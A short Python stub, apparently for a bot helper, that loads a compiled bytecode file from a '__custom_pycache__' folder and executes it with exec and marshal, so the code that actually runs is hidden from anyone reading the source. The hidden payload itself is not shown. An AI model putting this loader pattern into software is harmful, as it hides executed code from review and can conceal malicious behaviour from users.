
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BotHelper_17386cda20d0497783bb6956f24490e0.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
